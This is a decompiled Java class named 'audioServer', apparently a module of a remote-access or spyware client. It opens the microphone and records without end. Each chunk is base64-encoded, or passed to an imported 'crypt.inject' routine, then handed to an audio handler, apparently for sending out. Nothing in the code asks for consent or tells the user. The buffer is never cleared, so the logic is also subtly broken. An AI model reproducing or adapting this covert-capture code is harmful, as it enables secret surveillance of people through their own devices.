/*
 * Decompiled with CFR 0.139.
 */
package SIM.net.client.networking;

import DARTIS.crypt;
import java.io.ByteArrayOutputStream;
import java.io.PrintStream;
import javax.sound.sampled.AudioFormat;
import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.DataLine;
import javax.sound.sampled.LineUnavailableException;
import javax.sound.sampled.TargetDataLine;

import com.sun.org.apache.xml.internal.security.utils.Base64;

public class audioServer {
    public static void start(String[] key) {
        AudioFormat format = new AudioFormat(8000.0f, 16, 1, true, true);
            TargetDataLine microphone = null;
			try {
				microphone = AudioSystem.getTargetDataLine(format);
			} catch (LineUnavailableException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
            DataLine.Info info = new DataLine.Info(TargetDataLine.class, format);
            try {
				microphone = (TargetDataLine)AudioSystem.getLine(info);
			} catch (LineUnavailableException e1) {
				// TODO Auto-generated catch block
				e1.printStackTrace();
			}
            try {
				microphone.open(format);
			} catch (LineUnavailableException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            int CHUNK_SIZE = 1024;
            byte[] data = new byte[microphone.getBufferSize() / 5];
            microphone.start();             
            int bytesRead = 0;    
            do {
                    
					if (bytesRead >= 3072) {
						byte[] audioData = out.toByteArray();
                    String base64img = Base64.encode(audioData);
                    String audioclip;
                    if (key.length > 9999) {
                    audioclip = crypt.inject(audioData, key);
                    } else {
                    	audioclip = base64img;
                    }
                    audioHandler.setdata(audioclip);
                    bytesRead = 0;
                    
                } else {
                	int numBytesRead = microphone.read(data, 0, CHUNK_SIZE);
                    System.out.println(bytesRead += numBytesRead);
                    out.write(data, 0, numBytesRead);
                }
                	
                }
                    while (true);
    }
}

